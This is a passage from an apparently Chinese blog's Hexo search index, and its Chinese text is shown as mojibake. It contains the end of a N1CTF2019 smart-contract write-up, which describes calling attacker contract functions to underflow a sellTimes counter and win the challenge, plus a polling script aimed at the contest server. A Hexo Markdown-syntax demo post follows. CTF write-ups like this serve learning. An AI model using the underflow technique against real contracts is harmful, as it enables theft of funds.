è°ƒç”¨æ­¥éª¤æ”»å‡»åˆçº¦åœ°å€0x48e3c62a006758d26b3ded0f4e28317fe0ea9dc8è–…ç¾Šæ¯›è¾…åŠ©åˆçº¦åœ°å€0x334e9e1c289be32000182e549fbadf27589b436e è°ƒç”¨hackerçš„hack1å‡½æ•°ï¼Œä½¿å¾—sellTimes[address hacker]=1ï¼ŒbalanceOf[address hacker]=1 wei è°ƒç”¨hacker1çš„hack3å‡½æ•°ä¸¤æ¬¡ï¼Œä½¿å¾—balanceOf[address hacker]+200=201 è°ƒç”¨hackerçš„hack4å‡½æ•°ä¸¤æ¬¡ï¼Œæ¯æ¬¡amount=100ï¼Œè¿™æ ·ä¾¿ä½¿å¾—sellTimes[address hacker]å®Œæˆä¸‹æº¢ï¼Œå¯ä»¥çœ‹åˆ°sellTimes[address hacker]å·²ç»ä¸‹æº¢åˆ°ä¸€ä¸ªå¾ˆå¤§çš„æ•° æœ€åŽè°ƒç”¨hackerçš„hack5è°ƒç”¨winnerSubmitå®Œæˆæ”»å‡»(ä¸»åŠžæ–¹æœåŠ¡å·²å…³é—­23333æ‰€ä»¥æ²¡æ³•çœ‹åˆ°flagï¼Œåªæœ‰å½“æ—¶è¢«æ…å±Žæ£æžè¿‡çš„ä¸€å¼ æˆªå›¾äº†ï¼Œä¸€ç›´æ‹¿ä¸åˆ°flagï¼Œæœ€åŽå‘çŽ°flagåªæœ‰åœ¨è¯·æ±‚çš„é‚£ä¸€çž¬é—´ä¼šå‡ºçŽ°è€Œä¸”ä»…å‡ºçŽ°ä¸€æ¬¡ï¼Œè¯·åŽŸè°…æˆ‘ä¸ä¼šåˆ©ç”¨web3è‡ªåŠ¨åŒ–æ¨¡æ‹Ÿæ”»å‡»ï¼Œä¸è¿‡æœ€åŽè¿˜æ˜¯è§£å†³äº†ï¼Œå†™äº†ä¸ªè„šæœ¬ï¼Œä¸€ç›´è¯·æ±‚å°±å¯ä»¥ï¼ŒæˆåŠŸæ‹¿åˆ°äº†flagï¼Œè„šæœ¬å¦‚ä¸‹)123456import requestsurl="http://47.244.41.61/challenge?address=0x48e3c62a006758d26b3ded0f4e28317fe0ea9dc8"while True: print requests.get(url).content.split("alert")[1].split("script")[0]]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Solidity</tag>
        <tag>Smart Contract</tag>
        <tag>N1CTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Start My Blog Trip]]></title>
    <url>%2F2019%2FHello-World%2F</url>
    <content type="text"><![CDATA[å‰è¨€ä»‹ç»GrammaråŠå…¶Style åè¨€Life is a generic method like [ public Life doSomething(T t){} ],T is the part of life that requires you to play in a period of time,and the method will return a life you expect if you to be T. â€”â€” æ²ƒÂ·å…¹åŸºç¡•å¾· 1234&#123;% centerquote %&#125;Life is a generic method like [ public &lt;T&gt; Life doSomething(T t)&#123;&#125; ],T is the part of life that requires you to play in a period of time,and the method will return a life you expect if you to be T. â€”â€” ***æ²ƒÂ·å…¹åŸºç¡•å¾·***&#123;% endcenterquote %&#125; ä¸‹è½½å›¾å½¢è¾¹æ¡† Download Now1234&lt;a id=&quot;download&quot; href=&quot;https://git-scm.com/download/win&quot;&gt; &lt;i class=&quot;fa fa-download&quot;&gt;&lt;/i&gt; &lt;span&gt; Download Now&lt;/span&gt;&lt;/a&gt; åœ¨æ–‡æ¡£ä¸­å¢žåŠ å›¾æ ‡ æ”¯æŒMarkdownHexo æ”¯æŒ GitHub Flavored Markdown çš„æ‰€æœ‰åŠŸèƒ½, ç”šè‡³å¯ä»¥æ•´åˆ Octopress çš„å¤§å¤šæ•°æ’ä»¶. ä¸€é”®éƒ¨ç½²åªéœ€ä¸€æ¡æŒ‡ä»¤å³å¯éƒ¨ç½²åˆ°Github Pages, æˆ–å…¶ä»–ç½‘ç«™ ä¸°å¯Œçš„æ’ä»¶Hexo æ‹¥æœ‰å¼ºå¤§çš„æ’ä»¶ç³»ç»Ÿ, å®‰è£…æ’ä»¶å¯ä»¥è®© Hexo æ”¯æŒ Jade, CoffeeScript. 123456- &lt;i class=&quot;fa fa-pencil&quot;&gt;&lt;/i&gt;æ”¯æŒMarkdown&lt;i&gt;Hexo æ”¯æŒ GitHub Flavored Markdown çš„æ‰€æœ‰åŠŸèƒ½, ç”šè‡³å¯ä»¥æ•´åˆ Octopress çš„å¤§å¤šæ•°æ’ä»¶. &lt;/i&gt;- &lt;i class=&quot;fa fa-cloud-upload&quot;&gt;&lt;/i&gt;ä¸€é”®éƒ¨ç½²&lt;i&gt;åªéœ€ä¸€æ¡æŒ‡ä»¤å³å¯éƒ¨ç½²åˆ°Github Pages, æˆ–å…¶ä»–ç½‘ç«™&lt;/i&gt;- &lt;i class=&quot;fa fa-cog&quot;&gt;&lt;/i&gt;ä¸°å¯Œçš„æ’ä»¶&lt;i&gt;Hexo æ‹¥æœ‰å¼ºå¤§çš„æ’ä»¶ç³»ç»Ÿ, å®‰è£…æ’ä»¶å¯ä»¥è®© Hexo æ”¯æŒ Jade, CoffeeScript. &lt;/i&gt; &lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;1&lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;`&lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;` &lt;i class=&quot;fa fa-github fa-lg&quot;&gt;&lt;/i&gt;1&lt;i class=&quot;fa fa-github fa-lg&quot;&gt;&lt;/i&gt;`&lt;i class=&quot;fa fa-github fa-lg&quot;&gt;&lt;/i&gt;` &lt;i class=&quot;fa fa-github fa-2x&quot;&gt;&lt;/i&gt;1&lt;i class=&quot;fa fa-github fa-2x&quot;&gt;&lt;/i&gt;`&lt;i class=&quot;fa fa-github fa-2x&quot;&gt;&lt;/i&gt;` æ–‡å­—å¢žåŠ èƒŒæ™¯è‰²å—ç«™ç‚¹é…ç½®æ–‡ä»¶ , ä¸»é¢˜é…ç½®æ–‡ä»¶1234&lt;span id=&quot;inline-blue&quot;&gt;ç«™ç‚¹é…ç½®æ–‡ä»¶&lt;/span&gt;,&lt;span id=&quot;inline-purple&quot;&gt;ä¸»é¢˜é…ç½®æ–‡ä»¶&lt;/span&gt;&lt;span id=&quot;inline-green&quot;&gt;ç«™ç‚¹é…ç½®æ–‡ä»¶&lt;/span&gt;,&lt;span id=&quot;inline-yellow&quot;&gt;ä¸»é¢˜é…ç½®æ–‡ä»¶&lt;/span&gt; å¼•ç”¨è¾¹æ¡†å˜è‰²æˆ‘è¦å˜è‰²æˆ‘è¦å˜è‰²æˆ‘è¦å˜è‰²æˆ‘è¦å˜è‰² 123456789101112131415&lt;p id=&quot;div-border-top-red&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-top-yellow&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-top-green&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-top-blue&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-top-purple&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-left-red&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-left-yellow&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-left-green&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-left-blue&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-left-purple&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-right-red&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-right-yellow&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-right-green&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-right-blue&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt;&lt;p id=&quot;div-border-right-purple&quot;&gt;æˆ‘è¦å˜è‰²&lt;/p&gt; è‹±æ–‡åœˆèµ·æ¥çš„æ ·å¼åœˆåœˆåœ†åœ†1`åœˆåœˆåœ†åœ†` æ’å…¥ä»£ç 12345678910111213var disqus = &#123; load : function disqus()&#123; if(typeof DISQUS !== 'object') &#123; (function () &#123; var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); &#125;()); $('#load-disqus').html("è¯„è®ºåŠ è½½ä¸­, è¯·ç¡®ä¿ä½ æœ‰æ¢¯å­, è‹¥è¯„è®ºé•¿æ—¶é—´æœªåŠ è½½åˆ™ä½ å¯èƒ½ç¿»å¢™å¤±è´¥...").fadeOut(9000); //åŠ è½½åŽç§»é™¤æŒ‰é’® &#125; &#125;&#125; 1ä½¿ç”¨```ï¼ˆç»“å°¾è¿˜æœ‰ä¸€ä¸ªï¼‰javascript å›¾ç‰‡1![](https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/Hello-World/header_background.jpg) ä»£ç é«˜äº®Hello Worldç¤ºä¾‹è¿™æ˜¯é“¾æŽ¥1234 public static void main(String[] args) &#123;+ System.out.println("Hello World!");- System.out.println("Hello World!"); &#125; æ­£ç¡®å§¿åŠ¿, ä»£ç ç‰‡æ®µå¼€å¤´:1[language] [title] [url] [link-text] [language] æ˜¯ä»£ç è¯­è¨€çš„åç§°, ç”¨æ¥è®¾ç½®ä»£ç å—é¢œè‰²é«˜äº®, éžå¿…é¡»ï¼› [title] æ˜¯é¡¶éƒ¨å·¦è¾¹çš„è¯´æ˜Ž, éžå¿…é¡»ï¼› [url] æ˜¯é¡¶éƒ¨å³è¾¹çš„è¶…é“¾æŽ¥åœ°å€, éžå¿…é¡»ï¼› [link text] å¦‚å®ƒçš„å­—é¢æ„æ€, è¶…é“¾æŽ¥çš„åç§°, éžå¿…é¡». è¿™ 4 é¡¹åº”è¯¥æ˜¯æ ¹æ®ç©ºæ ¼æ¥åˆ†éš”, è€Œä¸æ˜¯[], æ•…è¯·ä¸è¦åŠ []. é™¤éžå¦‚æžœä½ æƒ³å†™åŽé¢ä¸¤ä¸ª, ä½†ä¸æƒ³å†™å‰é¢ä¸¤ä¸ª, é‚£ä¹ˆå°±å¿…é¡»åŠ []äº†, è¦è¿™æ ·å†™: [] [] [url] [link text]. é“¾æŽ¥https://hitcxy.com1[https://hitcxy.com](https://hitcxy.com) æ— åºåˆ—è¡¨ æ²¡æœ‰é¡ºåº1 æ²¡æœ‰é¡ºåº2 æ²¡æœ‰é¡ºåº3123- æ²¡æœ‰é¡ºåº1- æ²¡æœ‰é¡ºåº2- æ²¡æœ‰é¡ºåº3 é“¾æŽ¥+åˆ—è¡¨ ç™¾åº¦æäº¤å…¥å£ Googleæäº¤å…¥å£ 360æäº¤å…¥å£123* ***[ç™¾åº¦æäº¤å…¥å£](http://zhanzhang.baidu.com/linksubmit/url)**** ***[Googleæäº¤å…¥å£](https://www.google.com/webmasters/tools/home?hl=zh-CN)**** ***[360æäº¤å…¥å£](http://info.so.360.cn/site_submit.html)*** æ–œä½“ä½ çœ‹æˆ‘æ–œä¸æ–œ1*ä½ çœ‹æˆ‘æ–œä¸æ–œ* å¼ºè°ƒä½ çœ‹æˆ‘é‡ä¸é‡è¦1**ä½ çœ‹æˆ‘é‡ä¸é‡è¦** å‚è€ƒ å‚è€ƒhttp://codepub.cn/2015/04/06/Github-Pages-personal-blog-from-Octopress-to-Hexo/http://codepub.cn/2016/03/20/Hexo-blog-theme-switching-from-Jacman-to-NexT-Mist/123&gt; **å‚è€ƒ**&gt; ***[http://codepub.cn/2015/04/06/Github-Pages-personal-blog-from-Octopress-to-Hexo/](http://codepub.cn/2015/04/06/Github-Pages-personal-blog-from-Octopress-to-Hexo/)***&gt; ***[http://codepub.cn/2016/03/20/Hexo-blog-theme-switching-from-Jacman-to-NexT-Mist/](http://codepub.cn/2016/03/20/Hexo-blog-theme-switching-from-Jacman-to-NexT-Mist/)*** å¥½çœ‹çš„ç¬¦å·ã€Œå•¦å•¦å•¦ã€å°±åƒè¿™æ ·â†“]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Hello</tag>
        <tag>Grammar</tag>
      </tags>
  </entry>
</search>
